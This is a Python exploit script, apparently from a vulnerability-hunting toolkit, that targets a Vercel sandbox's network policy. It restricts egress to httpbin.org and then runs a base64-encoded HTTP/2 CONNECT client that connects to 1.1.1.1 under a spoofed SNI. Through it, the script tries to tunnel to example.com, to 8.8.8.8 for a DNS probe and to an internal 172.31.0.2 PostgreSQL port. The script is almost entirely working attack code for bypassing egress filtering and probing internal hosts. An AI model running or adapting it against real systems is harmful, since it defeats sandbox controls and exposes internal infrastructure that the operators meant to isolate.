# -*- coding: utf-8 -*-
"""h2 CONNECT 隧道: :method=CONNECT + :authority=任意目标
S1: CONNECT example.com:443 (非 allow) -> 隧道?
S2: CONNECT 8.8.8.8:53 -> 隧道 + DNS 探测
S3: CONNECT 172.31.0.2:5432 -> 隧道 + PG 探测
S4: CONNECT httpbin.org:443 (allow 自身) 对照
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def run(tag, sc, maxlen=1400):
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=90000)
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    print('[%s] %s' % (tag, out[:maxlen]), flush=True)
    return out

api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

H2C_CODE = '''import socket, ssl, struct, time

def read_frame(s):
    hdr = b''
    while len(hdr) < 9:
        d = s.recv(9 - len(hdr))
        if not d: return None
        hdr += d
    ln = int.from_bytes(hdr[0:3], 'big')
    body = b''
    while len(body) < ln:
        d = s.recv(ln - len(body))
        if not d: return None
        body += d
    return hdr[3], hdr[4], hdr[5:9], body

def h2_connect(authority, send_after=None):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        s = ctx.wrap_socket(socket.create_connection(('1.1.1.1', 443), timeout=6),
                            server_hostname='httpbin.org')
        s.sendall(b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n')
        s.sendall(b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00')
        # HEADERS: :method CONNECT (静态表无 -> literal), :authority
        h = b'\\x00' + b'\\x06' + b'CONNECT'   # literal new name :method? 不, 用 :method 索引 3 改值
        # :method CONNECT: 静态表 3 是 :method POST -> literal w/ incremental, name idx 3
        h = bytes([0x40 | 3, 7]) + b'CONNECT'
        # :authority literal (name idx 1)
        av = authority.encode()
        h += bytes([0x40 | 1, len(av)]) + av
        frame = b'\\x00\\x00' + bytes([len(h)]) + b'\\x01\\x04' + b'\\x00\\x00\\x00\\x01' + h
        s.sendall(frame)
        # 读响应
        resp = b''
        status_hdr = None
        s.settimeout(6)
        try:
            while True:
                f = read_frame(s)
                if not f: break
                if f[0] == 1:
                    status_hdr = f[3][:20]
                if f[0] == 0:
                    resp += f[3]
                if f[0] == 7:
                    print('T=%s GOAWAY %s' % (authority, f[3][:20]), flush=True)
                    break
                if f[0] == 4 and not (f[1] & 1):
                    s.sendall(b'\\x00\\x00\\x00\\x04\\x01\\x00\\x00\\x00\\x00\\x00')
                if f[0] == 8:  # WINDOW_UPDATE
                    pass
        except socket.timeout:
            pass
        # 如果隧道建立 (没有 GOAWAY/异常关闭) 且拿到 DATA -> 发隧道载荷
        if send_after and (resp or status_hdr is not None):
            try:
                s.sendall(send_after)
                s.settimeout(3)
                d = s.recv(200)
                print('T=%s TUNNEL_DATA %r' % (authority, d[:60]), flush=True)
            except Exception as e:
                print('T=%s TUNNEL_ERR %s' % (authority, type(e).__name__), flush=True)
        print('T=%s STATUS_HDR=%r RESP=%r' % (authority, status_hdr, resp[:80]), flush=True)
        s.close()
    except Exception as e:
        print('T=%s ERR %s %s' % (authority, type(e).__name__, str(e)[:70]), flush=True)

h2_connect('example.com:443')
h2_connect('8.8.8.8:53', send_after=struct.pack('!HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0) + b'\\x07example\\x03com\\x00' + struct.pack('!HH', 1, 1))
h2_connect('172.31.0.2:5432', send_after=struct.pack('!II', 8, 80877103))
h2_connect('httpbin.org:443')
print('H2C_DONE')
'''

b64 = base64.b64encode(H2C_CODE.encode()).decode()
run('S1-h2connect', 'echo %s | base64 -d | python3' % b64, maxlen=1800)

print('=== H2C DONE ===', flush=True)
